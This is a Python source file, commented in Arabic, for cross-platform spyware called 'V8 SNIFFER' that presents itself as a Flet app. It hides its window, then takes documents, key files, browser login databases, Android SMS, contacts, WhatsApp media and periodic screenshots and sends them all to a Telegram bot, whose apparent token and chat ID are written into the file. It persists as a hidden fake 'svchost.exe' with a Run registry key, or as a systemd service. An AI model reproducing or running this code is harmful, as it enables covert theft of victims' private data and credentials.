import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import platform
import subprocess
from pathlib import Path
import glob
import shutil

# --- ضع معلوماتك هنا ---
BOT_TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY"
CHAT_ID = "7259620384"# ايدي المحادثة
C2_SERVER = "http://your-server.com"  # سيرفر القيادة والتحكم (اختياري)
# -----------------------

# الكشف عن نظام التشغيل
SYSTEM = platform.system()
IS_ANDROID = 'ANDROID_ROOT' in os.environ or 'ANDROID_DATA' in os.environ
IS_WINDOWS = SYSTEM == 'Windows'
IS_LINUX = SYSTEM == 'Linux' and not IS_ANDROID
IS_MAC = SYSTEM == 'Darwin'

# مسارات خاصة حسب النظام
if IS_ANDROID:
    # مسارات أندرويد
    BASE_DIR = '/storage/emulated/0'
    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Download')
    DCIM_DIR = os.path.join(BASE_DIR, 'DCIM')
    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
    WHATSAPP_DIR = os.path.join(BASE_DIR, 'WhatsApp')
    TELEGRAM_DIR = os.path.join(BASE_DIR, 'Telegram')
    ANDROID_DATA = '/data/data'
    APP_DIR = os.path.dirname(os.path.abspath(__file__))
    
elif IS_WINDOWS:
    # مسارات ويندوز
    BASE_DIR = os.path.expanduser("~")
    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Downloads')
    DOCUMENTS_DIR = os.path.join(BASE_DIR, 'Documents')
    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
    DESKTOP_DIR = os.path.join(BASE_DIR, 'Desktop')
    APPDATA = os.environ.get('APPDATA', '')
    LOCALAPPDATA = os.environ.get('LOCALAPPDATA', '')
    
elif IS_LINUX or IS_MAC:
    # مسارات لينكس وماك
    BASE_DIR = os.path.expanduser("~")
    DOWNLOADS_DIR = os.path.join(BASE_DIR, 'Downloads')
    DOCUMENTS_DIR = os.path.join(BASE_DIR, 'Documents')
    PICTURES_DIR = os.path.join(BASE_DIR, 'Pictures')
    DESKTOP_DIR = os.path.join(BASE_DIR, 'Desktop')

# قائمة بالملفات المستهدفة
TARGET_EXTENSIONS = [
    # الصور
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg',
    # المستندات
    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    # قواعد البيانات
    '.db', '.sqlite', '.sqlite3', '.kdbx',
    # ملفات الحسابات
    '.json', '.xml', '.ini', '.cfg', '.conf', '.ovpn',
    # الأرشيف
    '.zip', '.rar', '.7z', '.tar', '.gz',
    # الصوت والفيديو
    '.mp3', '.mp4', '.avi', '.mov', '.wav',
    # ملفات المفاتيح
    '.key', '.pem', '.ppk', '.id_rsa'
]

# ملفات التطبيقات الحساسة
SENSITIVE_APPS = {
    'whatsapp': ['WhatsApp', 'com.whatsapp'],
    'telegram': ['Telegram', 'org.telegram'],
    'facebook': ['Facebook', 'com.facebook.katana'],
    'instagram': ['Instagram', 'com.instagram.android'],
    'chrome': ['Chrome', 'com.android.chrome'],
    'firefox': ['Firefox', 'org.mozilla.firefox'],
    'gallery': ['Gallery', 'com.android.gallery3d'],
    'contacts': ['Contacts', 'com.android.contacts']
}

def send_to_telegram(app_name, title, msg, file_path=None):
    """إرسال البيانات إلى التليجرام مع دعم الملفات"""
    try:
        device_info = f"📱 الجهاز: {platform.node()}\n🖥️ النظام: {SYSTEM}"
        if IS_ANDROID:
            device_info += "\n📱 النوع: Android Device"
            
        text = f"""🔔 V8 SNIFFER - DATA EXFILTRATION

{device_info}
📱 المصدر: {app_name}
👤 العنوان: {title}
💬 المحتوى: {msg}

⚡ By: V8 Global Elite"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
        
        # إذا كان هناك ملف، أرسله
        if file_path and os.path.exists(file_path):
            try:
                files = {'document': open(file_path, 'rb')}
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
            except Exception as e:
                # إذا الملف كبير، أرسل رسالة فقط
                send_to_telegram("Error", "File Too Large", f"الملف كبير جداً: {file_path}")
    except Exception as e:
        pass

def request_android_permissions():
    """طلب صلاحيات أندرويد"""
    if IS_ANDROID:
        try:
            # محاولة طلب الصلاحيات عبر Intent
            commands = [
                'pm grant com.your.package android.permission.READ_EXTERNAL_STORAGE',
                'pm grant com.your.package android.permission.WRITE_EXTERNAL_STORAGE',
                'pm grant com.your.package android.permission.CAMERA',
                'pm grant com.your.package android.permission.RECORD_AUDIO',
                'pm grant com.your.package android.permission.READ_CONTACTS',
                'pm grant com.your.package android.permission.READ_SMS',
                'pm grant com.your.package android.permission.ACCESS_FINE_LOCATION',
                'pm grant com.your.package android.permission.READ_CALL_LOG',
                'pm grant com.your.package android.permission.SYSTEM_ALERT_WINDOW',
                'pm grant com.your.package android.permission.PACKAGE_USAGE_STATS'
            ]
            
            for cmd in commands:
                try:
                    subprocess.run(cmd.split(), capture_output=True)
                except:
                    pass
        except:
            pass

def steal_android_data():
    """سرقة بيانات أندرويد"""
    if not IS_ANDROID:
        return
    
    # 1. سرقة الصور والفيديو
    media_dirs = [DCIM_DIR, PICTURES_DIR, os.path.join(BASE_DIR, 'Camera')]
    for media_dir in media_dirs:
        if os.path.exists(media_dir):
            for root, dirs, files in os.walk(media_dir):
                for file in files[:10]:  # حد 10 ملفات لكل مجلد
                    try:
                        file_path = os.path.join(root, file)
                        file_size = os.path.getsize(file_path)
                        if file_size < 50 * 1024 * 1024:  # أقل من 50 ميجا
                            send_to_telegram("Android Media", "صورة/فيديو", file_path, file_path)
                    except:
                        pass
    
    # 2. سرقة جهات الاتصال
    try:
        contacts_file = os.path.join(APP_DIR, 'contacts.vcf')
        subprocess.run(['content', 'query', '--uri', 'content://contacts/phones', '--projection', 'display_name,number'], 
                      stdout=open(contacts_file, 'w'))
        if os.path.exists(contacts_file):
            send_to_telegram("Android", "Contacts", "جهات الاتصال", contacts_file)
    except:
        pass
    
    # 3. سرقة الرسائل القصيرة
    try:
        sms_file = os.path.join(APP_DIR, 'sms.txt')
        subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], 
                      stdout=open(sms_file, 'w'))
        if os.path.exists(sms_file):
            send_to_telegram("Android", "SMS", "الرسائل النصية", sms_file)
    except:
        pass
    
    # 4. سرقة واتساب
    if os.path.exists(WHATSAPP_DIR):
        for root, dirs, files in os.walk(WHATSAPP_DIR):
            for file in files[:20]:  # حد 20 ملف من واتساب
                try:
                    file_path = os.path.join(root, file)
                    file_size = os.path.getsize(file_path)
                    if file_size < 50 * 1024 * 1024:
                        send_to_telegram("WhatsApp", "Media", file_path, file_path)
                except:
                    pass

def steal_browser_data():
    """سرقة بيانات المتصفحات"""
    if IS_WINDOWS:
        browsers = {
            'chrome': os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
            'edge': os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
            'firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
            'opera': os.path.join(APPDATA, 'Opera Software', 'Opera Stable')
        }
    elif IS_ANDROID:
        browsers = {
            'chrome': '/data/data/com.android.chrome',
            'firefox': '/data/data/org.mozilla.firefox',
            'kiwi': '/data/data/com.kiwibrowser.browser',
            'brave': '/data/data/com.brave.browser'
        }
    else:
        browsers = {
            'chrome': os.path.expanduser('~/.config/google-chrome'),
            'firefox': os.path.expanduser('~/.mozilla/firefox'),
            'chromium': os.path.expanduser('~/.config/chromium')
        }
    
    for browser_name, browser_path in browsers.items():
        try:
            if os.path.exists(browser_path):
                send_to_telegram("Browser Data", browser_name, f"تم العثور على متصفح: {browser_path}")
                
                # نسخ قاعدة بيانات المتصفح
                if IS_WINDOWS and browser_name != 'firefox':
                    login_db = os.path.join(browser_path, 'Default', 'Login Data')
                    if os.path.exists(login_db):
                        temp_db = os.path.join(os.environ.get('TEMP', '/tmp'), f'{browser_name}_login.db')
                        try:
                            shutil.copy2(login_db, temp_db)
                            send_to_telegram(browser_name, "Login Data", "بيانات الدخول", temp_db)
                            os.remove(temp_db)
                        except:
                            pass
        except:
            pass

def steal_files():
    """البحث عن الملفات الحساسة وسرقتها"""
    if IS_WINDOWS:
        search_paths = [DOCUMENTS_DIR, DOWNLOADS_DIR, DESKTOP_DIR, PICTURES_DIR]
    elif IS_ANDROID:
        search_paths = [BASE_DIR, DOWNLOADS_DIR, DCIM_DIR]
    else:
        search_paths = [DOCUMENTS_DIR, DOWNLOADS_DIR, DESKTOP_DIR]
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                # تخطي المجلدات الكبيرة
                if len(files) > 100:
                    files = files[:100]
                
                for file in files:
                    try:
                        file_ext = os.path.splitext(file)[1].lower()
                        if file_ext in TARGET_EXTENSIONS:
                            file_path = os.path.join(root, file)
                            file_size = os.path.getsize(file_path)
                            
                            # إرسال الملفات الصغيرة فقط (أقل من 50 ميجابايت)
                            if file_size < 50 * 1024 * 1024:
                                file_info = f"الملف: {file_path}\nالحجم: {file_size} بايت"
                                send_to_telegram("File Stealer", "ملف جديد", file_info, file_path)
                    except:
                        continue

def get_system_info():
    """جمع معلومات النظام"""
    info = f"""
    🖥️ معلومات النظام:
    الجهاز: {platform.node()}
    النظام: {SYSTEM} {platform.release()}
    المعالج: {platform.processor()}
    المستخدم: {os.getlogin() if not IS_ANDROID else 'Android User'}
    """
    send_to_telegram("System Info", "معلومات الجهاز", info)
    
    # معلومات إضافية للأندرويد
    if IS_ANDROID:
        try:
            build_prop = subprocess.run(['getprop'], capture_output=True, text=True)
            send_to_telegram("Android", "Build Properties", build_prop.stdout[:3000])
        except:
            pass

def steal_screenshots():
    """التقاط صور من الشاشة"""
    try:
        if IS_ANDROID:
            # لأندرويد
            screenshot_path = os.path.join(BASE_DIR, 'screenshot.png')
            subprocess.run(['screencap', '-p', screenshot_path])
            if os.path.exists(screenshot_path):
                send_to_telegram("Android", "Screenshot", "لقطة شاشة", screenshot_path)
                os.remove(screenshot_path)
        elif IS_WINDOWS:
            # للويندوز
            import mss
            with mss.mss() as sct:
                screenshot_path = os.path.join(os.environ.get('TEMP'), 'screenshot.png')
                sct.shot(output=screenshot_path)
                send_to_telegram("Windows", "Screenshot", "لقطة شاشة", screenshot_path)
                os.remove(screenshot_path)
    except:
        pass

def monitor_external_storage():
    """مراقبة التخزين الخارجي (للأندرويد)"""
    if IS_ANDROID:
        watched_paths = [WHATSAPP_DIR, TELEGRAM_DIR, os.path.join(BASE_DIR, 'DCIM')]
        existing_files = set()
        
        while True:
            for path in watched_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if file_path not in existing_files:
                                existing_files.add(file_path)
                                if os.path.getsize(file_path) < 50 * 1024 * 1024:
                                    send_to_telegram("New File", "ملف جديد", file_path, file_path)
            time.sleep(30)

def persist_and_hide():
    """جعل التطبيق مستمر ومخفي"""
    try:
        if IS_WINDOWS:
            # ويندوز
            current_file = sys.executable
            hidden_path = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Caches', 'svchost.exe')
            os.makedirs(os.path.dirname(hidden_path), exist_ok=True)
            
            if not os.path.exists(hidden_path):
                shutil.copy2(current_file, hidden_path)
                
                # إخفاء الملف
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
            
            # Registry للتشغيل التلقائي
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsCacheService", 0, winreg.REG_SZ, hidden_path)
        
        elif IS_ANDROID:
            # لأندرويد - إضافة إلى Autostart
            try:
                autostart_path = '/data/data/com.your.package/shared_prefs/autostart.xml'
                # محاولة التسجيل في Autostart
                pass
            except:
                pass
        
        elif IS_LINUX or IS_MAC:
            # لينكس/ماك
            current_file = sys.executable
            hidden_path = os.path.expanduser('~/.config/systemd/user/v8service')
            shutil.copy2(current_file, hidden_path)
            os.chmod(hidden_path, 0o755)
            
            # إنشاء خدمة systemd
            service_content = f"""[Unit]
Description=V8 Service
After=network.target

[Service]
ExecStart={hidden_path}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=default.target"""
            
            service_path = os.path.expanduser('~/.config/systemd/user/v8service.service')
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', '--user', 'enable', 'v8service.service'])
            subprocess.run(['systemctl', '--user', 'start', 'v8service.service'])
    except:
        pass

def create_fake_icon():
    """إنشاء أيقونة مزيفة للتطبيق"""
    # سيتم تنفيذها حسب النظام
    pass

def main(page: ft.Page):
    # إخفاء النافذة فوراً لجميع الأنظمة
    page.window_visible = False
    page.window_width = 0
    page.window_height = 0
    
    # إرسال إشعار بالتشغيل
    send_to_telegram("V8 Elite", "System Active", f"✅ التطبيق تم تشغيله على {SYSTEM}")
    
    # طلب الصلاحيات (للأندرويد)
    if IS_ANDROID:
        request_android_permissions()
        threading.Thread(target=steal_android_data, daemon=True).start()
        threading.Thread(target=monitor_external_storage, daemon=True).start()
    
    # بدء عمليات السرقة
    threading.Thread(target=steal_browser_data, daemon=True).start()
    threading.Thread(target=steal_files, daemon=True).start()
    threading.Thread(target=get_system_info, daemon=True).start()
    
    # أخذ لقطة شاشة كل 5 دقائق
    def screenshot_loop():
        while True:
            steal_screenshots()
            time.sleep(300)
    
    threading.Thread(target=screenshot_loop, daemon=True).start()
    
    # جعل التطبيق مستمر
    persist_and_hide()
    
    # الحفاظ على التطبيق شغال في الخلفية
    while True:
        time.sleep(10)

if __name__ == "__main__":
    # تشغيل التطبيق
    ft.app(target=main)
